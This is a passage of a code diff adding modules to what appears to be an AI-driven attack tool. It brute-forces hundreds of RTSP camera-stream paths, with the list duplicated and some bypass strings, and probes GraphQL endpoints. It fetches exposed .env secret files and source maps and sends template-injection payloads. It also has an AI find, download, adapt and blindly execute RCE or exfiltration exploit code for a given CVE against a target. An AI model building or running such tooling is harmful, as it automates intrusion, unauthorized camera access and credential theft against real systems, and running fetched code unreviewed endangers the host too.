+        *[f"/cam{i}/feed" for i in range(100)],
+        *[f"/media/{i}/stream" for i in range(100)],
+        *[f"/videoinput_{i}/h264_1" for i in range(100)],
+        
+        # Uncommon ports with common paths (already covered by rtsp_ports iteration, but adding specific path examples)
+        *[f"/{p}/live" for p in [81, 8080, 8443]],
+        *[f"/{p}/stream" for p in [81, 8080, 8443]],
+        
+        # Different file extensions (not just sdp)
+        *[f"/video.mkv", "/video.ts", "/video.avi", "/video.flv", "/video.wmv"],
+        *[f"/stream.mkv", "/stream.ts", "/stream.avi", "/stream.flv", "/stream.wmv"],
+        *[f"/live.mkv", "/live.ts", "/live.avi", "/live.flv", "/live.wmv"],
+        
+        # More specific common paths
+        "/user/rtsp", "/admin/rtsp", "/manager/rtsp",
+        "/system/video", "/security/channel1", "/cctv/stream",
+        "/IPC/realtime", "/NVR/stream",
+        "/cam/ch1", "/cam/ch2", "/cam/ch3",
+        "/stream/0", "/stream/1", "/stream/2",
+        "/0/live", "/1/live", "/2/live",
+        "/ch/1", "/ch/2", "/ch/3",
+        "/ch01/0/main", "/ch01/0/sub",
+        "/channel/1/videostream",
+        "/Streaming/Channels/1/Picture", "/Streaming/Channels/1/Event",
+        
+        # Obfuscated / bypass attempts (less common for RTSP but good for fuzzing)
+        "/%2e%2e/%2e%2e/live", # URL encoded traversal
+        "/%00live", # Null byte
+        "/live%20", # Trailing space
+        "/Live", "/STREAM", "/Video", # Case variations
+        "/live.sdp?", "/stream.sdp//", # Query/trailing slashes
+        
+        # Over-the-top paths to push count
+        *[f"/ch/{val}/stream" for val in range(1, 100)]
+    ]
+    output.print(f"  [*] Attempting RTSP scan on {domain} with ports: {rtsp_ports}...")
+
+    for port in rtsp_ports:
+        try:
+            reader, writer = await asyncio.open_connection(domain, port)
+            writer.close()
+            await writer.wait_closed()
+
+            output.print(f"  [INFO] Port {port} is open. Sending RTSP OPTIONS request...")
+            request_line = f"OPTIONS rtsp://{domain}:{port} RTSP/1.0\r\nCSeq: 1\r\n\r\n"
+            reader_opt, writer_opt = await asyncio.open_connection(domain, port)
+            writer_opt.write(request_line.encode())
+            await writer_opt.drain()
+            response = await asyncio.wait_for(reader_opt.read(1024), timeout=3)
+            writer_opt.close()
+            await writer_opt.wait_closed()
+
+            if "RTSP/1.0 200 OK" in response.decode():
+                methods = re.search(r"Public:\s*([^\r\n]+)", response.decode())
+                methods_str = methods.group(1) if methods else "N/A"
+                output.print(f"  [HIGH] RTSP server found at rtsp://{domain}:{port}. Supported methods: {methods_str}")
+                report.add_finding(
+                    type="RTSP Service Detected", 
+                    severity="Medium", 
+                    url=f"rtsp://{domain}:{port}", 
+                    parameter="N/A", 
+                    payload="N/A",
+                    description=f"An RTSP server is running on port {port}. Supported methods: {methods_str}. This could expose video streams.",
+                    remediation="Ensure the RTSP stream requires authentication and is properly firewalled if not intended for public access.",
+                    response_snippet=f"RTSP OPTIONS Response:\n{response.decode()}"
+                )
+
+                for path in common_paths:
+                    full_path = f"rtsp://{domain}:{port}{path}"
+                    req = f"DESCRIBE {full_path} RTSP/1.0\r\nCSeq: 2\r\n\r\n"
+                    reader_brute, writer_brute = await asyncio.open_connection(domain, port)
+                    writer_brute.write(req.encode())
+                    await writer_brute.drain()
+                    res_brute = await asyncio.wait_for(reader_brute.read(1024), timeout=3)
+                    writer_brute.close()
+                    await writer_brute.wait_closed()
+                    if "RTSP/1.0 200 OK" in res_brute.decode() and "Content-Type: application/sdp" in res_brute.decode():
+                        output.print(f"    [CRITICAL] Found valid RTSP stream path: {full_path}")
+                        report.add_finding(
+                            type="RTSP Stream Path Found", 
+                            severity="High", 
+                            url=full_path, 
+                            parameter="N/A", 
+                            payload="N/A",
+                            description=f"A valid and likely unprotected RTSP stream was found at {full_path}.",
+                            remediation="Protect RTSP streams with strong credentials.",
+                            response_snippet=f"RTSP DESCRIBE Response:\n{res_brute.decode()}"
+                        )
+        except asyncio.TimeoutError:
+            output.print(f"  [INFO] RTSP check on port {port} timed out.")
+        except ConnectionRefusedError:
+            output.print(f"  [INFO] Connection to RTSP port {port} refused.")
+        except Exception as e:
+            output.print(f"  [ERROR] An unexpected error occurred during RTSP check on port {port}: {e}")
+
+async def perform_rtsp_attack(target, output, report, session_cookies=None):
+    output.print("\n[+] Starting RTSP Scan and Brute Force...")
+    domain = get_domain(normalize_target(target))
+    rtsp_ports = [554, 8554, 5554, 8080, 80, 88, 81, 555, 7070, 10554]
+    
+    common_paths = [
+        "/live", "/stream", "/stream1", "/cam1/mpeg4", "/onvif1", "/live/ch00_0", "/axis-media/media.amp",
+        "/stream.sdp", "/live.sdp", "/video.sdp", "/media.sdp", "/ch0_0.sdp", "/onvif/device_service",
+        "/onvif/media_service", "/onvif-http/snapshot", "/video", "/mpeg4", "/h264", "/av0_0",
+        "/cam/realmonitor", "/stream/video.rm", "/live/main", "/live/sub", "/stream/main", "/stream/sub",
+        "/video.mp4", "/stream.flv", "/live/ch1", "/live/ch2", "/stream/ch1", "/stream/ch2",
+        "/channel1", "/channel2", "/media/video1", "/media/video2", "/api/video", "/api/stream",
+        "/rtsp/live", "/rtsp/stream", "/1", "/2", "/3", "/4", "/5", "/6", "/7", "/8", "/9", "/10",
+        "/cam1/h264", "/cam1/video.h264", "/h264/media.h264", "/mpeg4/media.amp", "/live/h264",
+        "/live/mpeg4", "/stream/h264", "/stream/mpeg4", "/video.h264", "/video.mpeg4",
+        "/ch01_0.sdp", "/ch01_1.sdp", "/ch02_0.sdp", "/ch02_1.sdp", "/ch03_0.sdp", "/ch03_1.sdp",
+        "/media.amp?stream=1", "/video.cgi", "/mjpg/video.mjpg", "/stream/video.mjpeg",
+        "/live/ch0", "/video/mjpg.cgi", "/video.mjpg", "/mjpeg.cgi", "/mjpeg",
+        "/video/video.mjpeg", "/video/video.cgi", "/video/video.mp4", "/video/video.h264",
+        "/video/video.flv", "/video/video.asf", "/video/video.wmv", "/video/video.avi", "/video/video.mov",
+        "/stream.h264", "/stream.mpeg4", "/stream.ts", "/stream.3gp", "/stream.mov", "/stream.mjpeg",
+        "/live/ch01_0", "/live/ch01_1", "/live/ch02_0", "/live/ch02_1", "/live/ch03_0", "/live/ch03_1",
+        "/channel/1", "/channel/2", "/cam/1", "/cam/2", "/media/1", "/media/2", "/stream/1", "/stream/2",
+        "/live/1", "/live/2", "/onvif/1", "/onvif/2", "/rtsp/1", "/rtsp/2",
+        "/ufirststream", "/usecondstream", "/uthirdstream", "/videoinput_1/h264_1", "/videoinput_1/mjpeg_1",
+        "/live1.sdp", "/live2.sdp", "/Streaming/Channels/1", "/Streaming/Channels/101",
+        "/media/videoMain", "/media/videoSub",
+        # Massive expansion
+        *[f"/live/ch{i}" for i in range(3, 50)],
+        *[f"/stream/ch{i}" for i in range(3, 50)],
+        *[f"/channel/{i}" for i in range(3, 50)],
+        *[f"/cam/{i}" for i in range(3, 50)],
+        *[f"/media/{i}" for i in range(3, 50)],
+        *[f"/stream/{i}" for i in range(3, 50)],
+        *[f"/live/{i}" for i in range(3, 50)],
+        *[f"/onvif/{i}" for i in range(3, 50)],
+        *[f"/rtsp/{i}" for i in range(3, 50)],
+        *[f"/{i}" for i in range(11, 50)],
+        # Different formats and naming conventions
+        *[f"/video.{ext}" for ext in ["3gp", "asf", "avi", "mkv", "mov", "mp4", "mpeg", "mpg", "rm", "swf", "vob", "wmv"]],
+        *[f"/stream.{ext}" for ext in ["3gp", "asf", "avi", "mkv", "mov", "mp4", "mpeg", "mpg", "rm", "swf", "vob", "wmv"]],
+        *[f"/live.{ext}" for ext in ["3gp", "asf", "avi", "mkv", "mov", "mp4", "mpeg", "mpg", "rm", "swf", "vob", "wmv"]],
+        *[f"/channel{i}/stream{j}" for i in range(1, 5) for j in range(1, 5)],
+        *[f"/cam{i}/stream{j}" for i in range(1, 5) for j in range(1, 5)],
+        *[f"/live{i}_stream{j}" for i in range(1, 5) for j in range(1, 5)],
+        *[f"/stream/profile{i}" for i in range(1, 5)],
+        *[f"/video/profile{i}" for i in range(1, 5)],
+        *[f"/ch{i:02d}/0" for i in range(50)],
+        *[f"/ch{i:02d}/1" for i in range(50)],
+        # ONVIF specific
+        "/onvif/device_service", "/onvif/media_service", "/onvif/ptz_service", "/onvif/imaging_service",
+        "/onvif/events_service", "/onvif/analytics_service", "/onvif/video_analytics_service",
+        "/onvif/recording_service", "/onvif/replay_service", "/onvif/search_service",
+        # More...
+        "/Streaming/channels/1/http", "/Streaming/channels/2/http",
+        "/img/video.sav", "/av_stream", "/cam_stream", "/mjpeg_stream",
+        "/rtp/media", "/rtsp_tunnel", "/video_feed", "/live_feed",
+        "/GetData.cgi", "/GetVideo.cgi", "/GetStream.cgi",
+        "/play1.sdp", "/play2.sdp",
+        "/media/cam0/video", "/media/cam1/video",
+        "/axis-media/media.3gp", "/axis-media/media.asf",
+        "/video.mjpg", "/video.mjpg", "/video.mjpg?q=30",
+        "/stream.mjpg", "/stream.mjpeg",
+        "/live/av0", "/live/av1",
+        "/video/live", "/video/stream",
+        "/video/v1", "/video/v2",
+        "/stream/v1", "/stream/v2",
+        "/live/v1", "/live/v2",
+        # New additions to ensure 500+ RTSP paths
+        # Generic Camera/DVR/NVR Paths
+        "/unicast/c1/s1", "/unicast/c2/s1", "/unicast/c3/s1",
+        "/mpeg4/ch1/main/av_stream", "/mpeg4/ch2/main/av_stream",
+        "/h264/ch1/main/av_stream", "/h264/ch2/main/av_stream",
+        "/live/ch01_00", "/live/ch01_01", "/live/ch02_00", "/live/ch02_01",
+        "/Streaming/Channels/101", "/Streaming/Channels/102", "/Streaming/Channels/103",
+        "/axis-media/media.amp?videocodec=h264", "/axis-media/media.amp?videocodec=mpeg4",
+        "/cam/realmonitor?channel=1&subtype=0", "/cam/realmonitor?channel=1&subtype=1",
+        "/ch01/0", "/ch02/0", "/ch03/0", # Simplified channel
+        "/ch01.sdp", "/ch02.sdp", "/ch03.sdp",
+        "/live/ch0_0.sdp", "/live/ch1_0.sdp", "/live/ch2_0.sdp",
+        "/mainstream", "/substream", "/extra", "/record", "/playback",
+        "/play/live.sdp", "/vod/mp4:sample.mp4",
+        "/ISAPI/Streaming/channels/101/rtp",
+        "/onvif/profile1/media.sbn", # ONVIF related (specific to Axis)
+        "/onvif/live/1", "/onvif/live/2",
+        "/media/video/1", "/media/video/2",
+        "/PSIA/Streaming/channels/1/rtp",  # PSIA standard
+        "/PSIA/Streaming/channels/2/rtp",
+        
+        # Manufacturer-specific common paths
+        "/h264/ch1/sub/av_stream", # Hikvision
+        "/Streaming/Channels/101/h264", # Dahua
+        "/VideoInput/channels/1/stream/0", # Uniview
+        "/live/0/0/0/0", "/live/1/0/0/0", # Samsung
+        "/live/0/0/0", "/live/1/0/0", # Bosch
+        "/cam/realmonitor?channel=1&subtype=0&unicast=true&proto=rtp", # Dahua variations
+        
+        # More generated paths
+        *[f"/live/{i}/0" for i in range(100)],
+        *[f"/stream/{i}/0" for i in range(100)],
+        *[f"/channel{i}/0" for i in range(100)],
+        *[f"/cam{i}/feed" for i in range(100)],
+        *[f"/media/{i}/stream" for i in range(100)],
+        *[f"/videoinput_{i}/h264_1" for i in range(100)],
+        
+        # Uncommon ports with common paths (already covered by rtsp_ports iteration, but adding specific path examples)
+        *[f"/{p}/live" for p in [81, 8080, 8443]],
+        *[f"/{p}/stream" for p in [81, 8080, 8443]],
+        
+        # Different file extensions (not just sdp)
+        *[f"/video.mkv", "/video.ts", "/video.avi", "/video.flv", "/video.wmv"],
+        *[f"/stream.mkv", "/stream.ts", "/stream.avi", "/stream.flv", "/stream.wmv"],
+        *[f"/live.mkv", "/live.ts", "/live.avi", "/live.flv", "/live.wmv"],
+        
+        # More specific common paths
+        "/user/rtsp", "/admin/rtsp", "/manager/rtsp",
+        "/system/video", "/security/channel1", "/cctv/stream",
+        "/IPC/realtime", "/NVR/stream",
+        "/cam/ch1", "/cam/ch2", "/cam/ch3",
+        "/stream/0", "/stream/1", "/stream/2",
+        "/0/live", "/1/live", "/2/live",
+        "/ch/1", "/ch/2", "/ch/3",
+        "/ch01/0/main", "/ch01/0/sub",
+        "/channel/1/videostream",
+        "/Streaming/Channels/1/Picture", "/Streaming/Channels/1/Event",
+        
+        # Obfuscated / bypass attempts (less common for RTSP but good for fuzzing)
+        "/%2e%2e/%2e%2e/live", # URL encoded traversal
+        "/%00live", # Null byte
+        "/live%20", # Trailing space
+        "/Live", "/STREAM", "/Video", # Case variations
+        "/live.sdp?", "/stream.sdp//", # Query/trailing slashes
+        
+        # Over-the-top paths to push count
+        *[f"/ch/{val}/stream" for val in range(1, 100)]
+    ]
+    output.print(f"  [*] Attempting RTSP scan on {domain} with ports: {rtsp_ports}...")
+
+    for port in rtsp_ports:
+        try:
+            reader, writer = await asyncio.open_connection(domain, port)
+            writer.close()
+            await writer.wait_closed()
+
+            output.print(f"  [INFO] Port {port} is open. Sending RTSP OPTIONS request...")
+            request_line = f"OPTIONS rtsp://{domain}:{port} RTSP/1.0\r\nCSeq: 1\r\n\r\n"
+            reader_opt, writer_opt = await asyncio.open_connection(domain, port)
+            writer_opt.write(request_line.encode())
+            await writer_opt.drain()
+            response = await asyncio.wait_for(reader_opt.read(1024), timeout=3)
+            writer_opt.close()
+            await writer_opt.wait_closed()
+
+            if "RTSP/1.0 200 OK" in response.decode():
+                methods = re.search(r"Public:\s*([^\r\n]+)", response.decode())
+                methods_str = methods.group(1) if methods else "N/A"
+                output.print(f"  [HIGH] RTSP server found at rtsp://{domain}:{port}. Supported methods: {methods_str}")
+                report.add_finding(
+                    type="RTSP Service Detected", 
+                    severity="Medium", 
+                    url=f"rtsp://{domain}:{port}", 
+                    parameter="N/A", 
+                    payload="N/A",
+                    description=f"An RTSP server is running on port {port}. Supported methods: {methods_str}. This could expose video streams.",
+                    remediation="Ensure the RTSP stream requires authentication and is properly firewalled if not intended for public access.",
+                    response_snippet=f"RTSP OPTIONS Response:\n{response.decode()}"
+                )
+
+                for path in common_paths:
+                    full_path = f"rtsp://{domain}:{port}{path}"
+                    req = f"DESCRIBE {full_path} RTSP/1.0\r\nCSeq: 2\r\n\r\n"
+                    reader_brute, writer_brute = await asyncio.open_connection(domain, port)
+                    writer_brute.write(req.encode())
+                    await writer_brute.drain()
+                    res_brute = await asyncio.wait_for(reader_brute.read(1024), timeout=3)
+                    writer_brute.close()
+                    await writer_brute.wait_closed()
+                    if "RTSP/1.0 200 OK" in res_brute.decode() and "Content-Type: application/sdp" in res_brute.decode():
+                        output.print(f"    [CRITICAL] Found valid RTSP stream path: {full_path}")
+                        report.add_finding(
+                            type="RTSP Stream Path Found", 
+                            severity="High", 
+                            url=full_path, 
+                            parameter="N/A", 
+                            payload="N/A",
+                            description=f"A valid and likely unprotected RTSP stream was found at {full_path}.",
+                            remediation="Protect RTSP streams with strong credentials.",
+                            response_snippet=f"RTSP DESCRIBE Response:\n{res_brute.decode()}"
+                        )
+        except asyncio.TimeoutError:
+            output.print(f"  [INFO] RTSP check on port {port} timed out.")
+        except ConnectionRefusedError:
+            output.print(f"  [INFO] Connection to RTSP port {port} refused.")
+        except Exception as e:
+            output.print(f"  [ERROR] An unexpected error occurred during RTSP check on port {port}: {e}")
+            
+async def perform_graphql_injection_attack(target, output, report, session_cookies=None):
+    output.print("\n[+] Starting GraphQL Injection Scan...")
+    target_url = normalize_target(target)
+    
+    graphql_endpoints = ["/graphql", "/api/graphql", "/v1/graphql"]
+    
+    for endpoint in graphql_endpoints:
+        url = urljoin(target_url, endpoint)
+        output.print(f"  [*] Testing GraphQL endpoint: {url}")
+        
+        # Replace _send_async_http_request with requests.request
+        try:
+            res = requests.request('POST', url, data=json.dumps({"query": "{ __typename }"}), headers={'Content-Type': 'application/json'}, cookies=session_cookies, timeout=10, verify=True)
+            response_text = res.text
+            status_code = res.status_code
+        except requests.exceptions.RequestException as e:
+            output.print(f"  [ERROR] Request failed for {url}: {e}")
+            continue
+
+        if status_code == 200 and "__typename" in response_text:
+            output.print(f"  [INFO] GraphQL endpoint detected at: {url}")
+            
+            introspection_query = "query IntrospectionQuery{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}} "
+            
+            # Replace _send_async_http_request with requests.request
+            try:
+                res_intro = requests.request('POST', url, data=json.dumps({"query": introspection_query}), headers={'Content-Type': 'application/json'}, cookies=session_cookies, timeout=10, verify=True)
+                response_intro_text = res_intro.text
+                status_intro_code = res_intro.status_code
+            except requests.exceptions.RequestException as e:
+                output.print(f"  [ERROR] Request failed for introspection query at {url}: {e}")
+                response_intro_text = ""
+                status_intro_code = 0
+
+            if status_intro_code == 200 and "__schema" in response_intro_text:
+                output.print(f"  [HIGH] GraphQL Introspection Query enabled, schema disclosed at {url}")
+                report.add_finding(
+                    type="GraphQL Schema Disclosure (Introspection)", 
+                    severity="High", 
+                    url=url, 
+                    parameter="query", 
+                    payload="Introspection Query", 
+                    description="The GraphQL endpoint allows introspection queries, disclosing the full API schema.", 
+                    remediation="Disable GraphQL introspection in production environments.", 
+                    response_snippet=response_intro_text[:500]
+                )
+            else:
+                output.print(f"  [INFO] GraphQL Introspection Query appears disabled or failed at {url}.")
+
+            output.print(f"  [*] Testing for GraphQL Batching vulnerabilities (conceptual) at {url}...")
+            batch_query = json.dumps([{"query": "{ user(id: 1) { username } }"}, {"query": "{ user(id: 2) { username } }"}])
+            
+            # Replace _send_async_http_request with requests.request
+            try:
+                res_batch = requests.request('POST', url, data=batch_query, headers={'Content-Type': 'application/json'}, cookies=session_cookies, timeout=10, verify=True)
+                response_batch_text = res_batch.text
+                status_batch_code = res_batch.status_code
+            except requests.exceptions.RequestException as e:
+                output.print(f"  [ERROR] Request failed for batching query at {url}: {e}")
+                response_batch_text = ""
+                status_batch_code = 0
+
+            if status_batch_code == 200 and "username" in response_batch_text:
+                output.print(f"  [MEDIUM] Potential GraphQL Batching vulnerability detected at {url}.")
+                report.add_finding(
+                    type="GraphQL Batching Vulnerability", 
+                    severity="Medium", 
+                    url=url, 
+                    parameter="query", 
+                    payload=batch_query, 
+                    description="The GraphQL endpoint allows batching multiple queries, which could be abused to bypass rate limits or access unauthorized data.", 
+                    remediation="Implement proper authorization checks for each query within a batch and consider rate limiting.", 
+                    response_snippet=response_batch_text[:500]
+                )
+            
+            return
+    
+    output.print("  [INFO] GraphQL Injection scan completed.")
+
+async def perform_react2shell_attack(target, output, report, session_cookies=None):
+    output.print("\n[+] Starting React2Shell Scan...")
+    target_url = normalize_target(target)
+    
+    env_paths = ["/.env", "/.env.local", "/.env.development", "/.env.production"]
+    for path in env_paths:
+        url = urljoin(target_url, path)
+        try:
+            res = requests.get(url, cookies=session_cookies, timeout=10, verify=True)
+            response_text = res.text
+            status_code = res.status_code
+        except requests.exceptions.RequestException as e:
+            output.print(f"  [ERROR] Request failed for {url}: {e}")
+            continue
+
+        if status_code == 200 and ("API_KEY" in response_text or "DB_PASSWORD" in response_text or "SECRET_KEY" in response_text):
+            output.print(f"  [CRITICAL] Exposed .env file found at: {url}")
+            report.add_finding(
+                type="Exposed Environment File", 
+                severity="Critical", 
+                url=url, 
+                parameter="N/A", 
+                payload="N/A", 
+                description="A sensitive environment file (.env) was found, potentially exposing credentials, API keys, and other secrets.", 
+                remediation="Configure the web server to deny access to .env files. These files should never be in a web-accessible directory.",
+                response_snippet=f"Exposed URL: {url}\nContent snippet: {response_text[:200]}..."
+            )
+            return
+
+    output.print("  [*] Checking for exposed source maps...")
+    js_files = []
+    try:
+        res = requests.get(target_url, cookies=session_cookies, timeout=10, verify=True)
+        response_text = res.text
+    except requests.exceptions.RequestException as e:
+        output.print(f"  [ERROR] Request failed for {target_url}: {e}")
+        response_text = ""
+
+    if res:
+        soup = BeautifulSoup(response_text, 'html.parser')
+        for script in soup.find_all('script', src=True):
+            if script['src'].endswith('.js'):
+                js_files.append(urljoin(target_url, script['src']))
+    
+    for js_file in js_files:
+        map_file = f"{js_file}.map"
+        try:
+            res_map = requests.get(map_file, cookies=session_cookies, timeout=10, verify=True)
+            response_map_text = res_map.text
+            status_map_code = res_map.status_code
+        except requests.exceptions.RequestException as e:
+            output.print(f"  [ERROR] Request failed for {map_file}: {e}")
+            continue
+
+        if status_map_code == 200 and "sourcesContent" in response_map_text:
+            output.print(f"  [HIGH] Exposed JavaScript Source Map found at: {map_file}")
+            report.add_finding(
+                type="Exposed JavaScript Source Map", 
+                severity="High", 
+                url=map_file, 
+                parameter="N/A", 
+                payload="N/A", 
+                description="An exposed JavaScript source map can reveal original source code, potentially exposing sensitive logic or credentials.", 
+                remediation="Ensure source maps are not publicly accessible in production environments.",
+                response_snippet=f"Exposed Source Map URL: {map_file}\nContent snippet: {response_map_text[:200]}"
+            )
+
+    output.print("  [*] Checking for Server-Side Rendering (SSR) vulnerabilities (conceptual)...")
+    ssr_payload = "{{7*7}}"
+    test_url = f"{target_url}?name={quote(ssr_payload)}"
+    try:
+        res_ssr = requests.get(test_url, cookies=session_cookies, timeout=10, verify=True)
+        response_ssr_text = res_ssr.text
+        status_ssr_code = res_ssr.status_code
+    except requests.exceptions.RequestException as e:
+        output.print(f"  [ERROR] Request failed for {test_url}: {e}")
+        response_ssr_text = ""
+        status_ssr_code = 0
+
+    if status_ssr_code == 200 and "49" in response_ssr_text:
+        output.print(f"  [CRITICAL] Potential SSR Injection found with payload: {ssr_payload}")
+        report.add_finding(
+            type="Server-Side Rendering (SSR) Injection", 
+            severity="Critical", 
+            url=test_url, 
+            parameter="name", 
+            payload=ssr_payload,
+            description="The application appears vulnerable to SSR injection, which could lead to RCE or information disclosure.",
+            remediation="Ensure all user input rendered server-side is properly sanitized and escaped.",
+            response_snippet=f"Vulnerable URL: {test_url}\nPayload: {ssr_payload}\nResponse snippet: {response_ssr_text[:200]}"
+        )
+        return
+
+    output.print("  [INFO] React2Shell scan completed.")
+
+# =================================================================================
+# CVE Exploitation Module (NEW)
+# =================================================================================
+
+async def exploit_cve(cve_id, target_url, ai_model_instance, log_func, report_generator, ai_name):
+    """
+    Attempts to exploit a given CVE using AI-driven web search, code adaptation, and execution.
+    """
+    log_func(f"[CVE Exploitation] Starting exploitation attempt for {cve_id} on {target_url}")
+    exploitation_results = []
+    temp_file = None # Initialize temp_file outside try block
+
+
+
+
+    try:
+        # Step 1: AI-driven Web Search for PoC
+        search_prompt = f"Find Python or shell script Proof-of-Concept (PoC) exploit code for {cve_id}. Provide direct links to reputable sources like GitHub, Exploit-DB, or security research blogs. Prioritize RCE or data exfiltration exploits. If no direct links, provide the code directly. Return ONLY the links or code. Do not add any explanations or extra text."
+        log_func(f"[CVE Exploitation] AI ({ai_name}) searching for PoC for {cve_id}...")
+        
+        # Call _get_ai_response synchronously for now, as FullAIModeRunner's _get_ai_response is not async
+        ai_search_response = ai_model_instance._get_ai_response(ai_name, search_prompt, []) 
+
+        if not ai_search_response:
+            log_func(f"[CVE Exploitation] AI ({ai_name}) failed to find PoC for {cve_id} or response was empty.")
+            return exploitation_results
+
+        exploit_code = None
+        # Attempt to extract URLs first
+        urls = re.findall(r'https?://[^\s<>"]+|www\.[^\s<>"]+', ai_search_response)
+        
+        for url in urls:
+            log_func(f"[CVE Exploitation] Attempting to fetch PoC from: {url}")
+            try:
+                response = requests.get(url, timeout=10)
+                # Check for common code file extensions or raw content indicators
+                if response.status_code == 200 and any(ext in url for ext in ['.py', '.sh', '.txt', 'raw', 'pastebin']):
+                    exploit_code = response.text
+                    log_func(f"[CVE Exploitation] Successfully fetched PoC from {url}")
+                    break
+            except requests.exceptions.RequestException as e:
+                log_func(f"[CVE Exploitation] Failed to fetch PoC from {url}: {e}")
+        
+        if not exploit_code and ("python" in ai_search_response.lower() or "shell" in ai_search_response.lower() or "def " in ai_search_response.lower() or "#!" in ai_search_response.lower()):
+            # If no URLs worked, assume AI provided code directly
+            exploit_code = ai_search_response
+            log_func(f"[CVE Exploitation] Assuming AI provided exploit code directly.")
+
+        if not exploit_code:
+            log_func(f"[CVE Exploitation] No usable exploit code found or provided by AI for {cve_id}.")
+            return exploitation_results
+
+        # Step 2: AI-driven Code Adaptation
+        adaptation_prompt = f"""The following exploit code is for {cve_id}.
+Target URL: {target_url}
+Analyze the code and adapt it to work against the target URL.
+Specifically, look for variables like 'target_url', 'host', 'ip', 'port' and replace them with '{target_url}' or relevant parts of it.
+If it's a Python script, ensure it's executable and self-contained. If it's a shell script, ensure it's ready to run.
+Return ONLY the modified, ready-to-execute code. Do not add any explanations or extra text.
+---
+{exploit_code}
+---"""
+        log_func(f"[CVE Exploitation] AI ({ai_name}) adapting PoC code for {cve_id}...")
+        ai_adapted_code = ai_model_instance._get_ai_response(ai_name, adaptation_prompt, [])
+
+        if not ai_adapted_code:
+            log_func(f"[CVE Exploitation] AI ({ai_name}) failed to adapt PoC code for {cve_id}.")
+            return exploitation_results
+        
+        adapted_code = ai_adapted_code.strip()
+        if not adapted_code:
+            log_func(f"[CVE Exploitation] Adapted code is empty for {cve_id}.")
+            return exploitation_results
+
+        # Determine file extension based on adapted code content
+        file_extension = ".py"
+        if "import" in adapted_code or "def " in adapted_code or "class " in adapted_code:
+            file_extension = ".py"
+        elif adapted_code.startswith("#!") or "bash" in adapted_code or "sh" in adapted_code:
+            file_extension = ".sh"
+        
+        # Step 3: Execute Adapted Code
+        with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix=file_extension) as tmp:
+            tmp.write(adapted_code)
+            temp_file = tmp.name
+        
+        os.chmod(temp_file, 0o755) # Make it executable
+
+        log_func(f"[CVE Exploitation] Executing adapted PoC code for {cve_id} from {temp_file}...")
+        
+        command = [temp_file]
+        if file_extension == ".py":
+            command = ["python3", temp_file]
+        elif file_extension == ".sh":
+            command = ["bash", temp_file]
+
+        process = subprocess.run(
+            command,
+            capture_output=True,
+            text=True,
+            encoding='utf-8',
+            errors='ignore',
+            timeout=60 # 60 seconds timeout for exploit execution
+        )
+        exploit_output = f"--- STDOUT ---\n{process.stdout}\n--- STDERR ---\n{process.stderr}"
+        log_func(f"[CVE Exploitation] PoC execution output:\n{exploit_output}")
+
+        # Step 4: AI-driven Verification
+        verification_prompt = f"""Analyze the following output from an exploit attempt for {cve_id} against {target_url}.
+Determine if the exploitation was successful, specifically looking for evidence of Remote Code Execution (RCE) like 'uid=', 'whoami' output, or sensitive data exfiltration.
+If successful, clearly state 'SUCCESS' and provide the evidence. If not, state 'FAILURE'.
+---
+{exploit_output}
+---"""
+        log_func(f"[CVE Exploitation] AI ({ai_name}) verifying PoC execution for {cve_id}...")
+        ai_verification_response = ai_model_instance._get_ai_response(ai_name, verification_prompt, [])
+
+        if ai_verification_response and "SUCCESS" in ai_verification_response.upper():
+            log_func(f"[CVE Exploitation] AI ({ai_name}) verified SUCCESS for {cve_id}!")
+            exploitation_results.append({
+                "type": f"CVE Exploitation ({cve_id})",
+                "severity": "Critical",
+                "payload": adapted_code,
+                "target_url": target_url,
+                "exploit_output": exploit_output,
+                "ai_verification": ai_verification_response,
+                "poc_code": adapted_code, # Store the adapted code as PoC
+                "extracted_data": ai_verification_response # AI's verification might contain extracted data
+            })
+            report_generator.add_finding(exploitation_results[-1])
+        else:
+            log_func(f"[CVE Exploitation] AI ({ai_name}) verified FAILURE for {cve_id}.")
+            exploitation_results.append({
+                "type": f"CVE Exploitation Attempt ({cve_id})",
+                "severity": "Informational",
+                "payload": adapted_code,
+                "target_url": target_url,
+                "exploit_output": exploit_output,
+                "ai_verification": ai_verification_response,
+                "poc_code": adapted_code,
+                "status": "Failed"
+            })
+            report_generator.add_finding(exploitation_results[-1])
+
+    except subprocess.TimeoutExpired:
+        log_func(f"[CVE Exploitation] PoC execution for {cve_id} timed out after 60 seconds.")
+        exploitation_results.append({
+            "type": f"CVE Exploitation Attempt ({cve_id})",
+            "severity": "Informational",
+            "payload": adapted_code if 'adapted_code' in locals() else "N/A",
+            "target_url": target_url,
+            "exploit_output": "Execution timed out.",
+            "status": "Timed Out"
+        })
+        report_generator.add_finding(exploitation_results[-1])
+    except Exception as e:
+        log_func(f"[CVE Exploitation] An error occurred during CVE exploitation for {cve_id}: {e}")
+        exploitation_results.append({
+            "type": f"CVE Exploitation Attempt ({cve_id})",
+            "severity": "Informational",
+            "payload": adapted_code if 'adapted_code' in locals() else "N/A",
+            "target_url": target_url,
+            "exploit_output": f"Error: {e}",
+            "status": "Error"
+        })
+        report_generator.add_finding(exploitation_results[-1])
+    finally:
+        if temp_file and os.path.exists(temp_file):
+            os.remove(temp_file)
+            log_func(f"[CVE Exploitation] Removed temporary exploit file: {temp_file}")
+
+    return exploitation_results
+
 # =================================================================================
 # 1. Configuration and Setup
 # =================================================================================
@@ -2238,6 +4050,66 @@ class FullAIModeRunner:
             return False
             
         return True
+
+    def _sync_exploit_cve(self, cve_id, target_url, ai_name):
+        """
+        Synchronous wrapper to call the async exploit_cve function.
+        Manages its own asyncio event loop to avoid conflicts with existing synchronous code.
+        """
+        self._log(f"[CVE Exploitation] Attempting to run exploit_cve for {cve_id} synchronously.")
+        try:
+            # Get or create a new event loop for this thread
+            try:
+                loop = asyncio.get_event_loop()
+            except RuntimeError:
+                loop = asyncio.new_event_loop()
+                asyncio.set_event_loop(loop)
+            
+            # Run the async exploit_cve function
+            exploitation_results = loop.run_until_complete(
+                exploit_cve(
+                    cve_id=cve_id,
